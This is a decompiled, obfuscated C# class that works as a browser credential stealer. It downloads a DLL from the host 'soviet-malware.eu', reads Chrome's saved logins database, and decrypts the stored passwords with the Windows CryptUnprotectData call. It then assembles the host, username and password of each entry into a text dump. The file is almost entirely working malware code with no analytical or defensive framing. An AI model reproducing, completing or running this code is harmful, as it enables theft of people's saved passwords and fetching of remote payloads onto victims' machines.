using System;
using System.ComponentModel;
using System.Data.SqlClient;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns2;

internal class Class13
{
	[Flags]
	internal enum Enum0
	{
		flag_0 = 1,
		flag_1 = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	internal struct Struct1
	{
		public int int_0;

		public Enum0 enum0_0;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	internal struct Struct2
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	public static string string_0;

	public static object smethod_0()
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_0170: Unknown result type (might be due to invalid IL or missing references)
		((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile("http://soviet-malware.eu/System.Data.SQLite.DLL", Application.get_StartupPath() + "\\System.Data.SQLite.DLL");
		object result = default(object);
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
			if (File.Exists(text))
			{
				SqlConnection val = new SqlConnection();
				val.set_ConnectionString("Data Source=" + text + ";");
				val.Open();
				SqlCommand val2 = val.CreateCommand();
				val2.set_CommandText("SELECT * FROM logins");
				SqlDataReader val3 = val2.ExecuteReader();
				while (val3.Read())
				{
					string text2 = Conversions.ToString(val3.get_Item("origin_url"));
					string text3 = Conversions.ToString(val3.get_Item("username_value"));
					string text4 = smethod_1((byte[])val3.get_Item("password_value"));
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						ListViewItem val4 = new ListViewItem();
						val4.set_Text(text2);
						string_0 = "============Chrome==============\r\nHost: " + text2 + "\r\nUsername: " + text3 + "\r\nPassword: " + text4 + "\r\n=============================\r\n ";
					}
				}
				((Component)(object)val2).Dispose();
				val.Close();
				return result;
			}
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct2 struct2_0, string string_1, ref Struct2 struct2_1, IntPtr intptr_0, ref Struct1 struct1_0, int int_0, ref Struct2 struct2_2);

	public static string smethod_1(byte[] byte_0)
	{
		Struct2 struct2_ = default(Struct2);
		Struct2 struct2_2 = default(Struct2);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		struct2_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct2_.int_0 = byte_0.Length;
		gCHandle.Free();
		Struct2 @struct = default(Struct2);
		Struct2 struct2_3 = @struct;
		Struct1 struct2 = default(Struct1);
		Struct1 struct1_ = struct2;
		IntPtr intptr_ = default(IntPtr);
		CryptUnprotectData(ref struct2_, null, ref struct2_3, intptr_, ref struct1_, 0, ref struct2_2);
		checked
		{
			byte[] array = new byte[struct2_2.int_0 + 1];
			Marshal.Copy(struct2_2.intptr_0, array, 0, struct2_2.int_0);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}
}
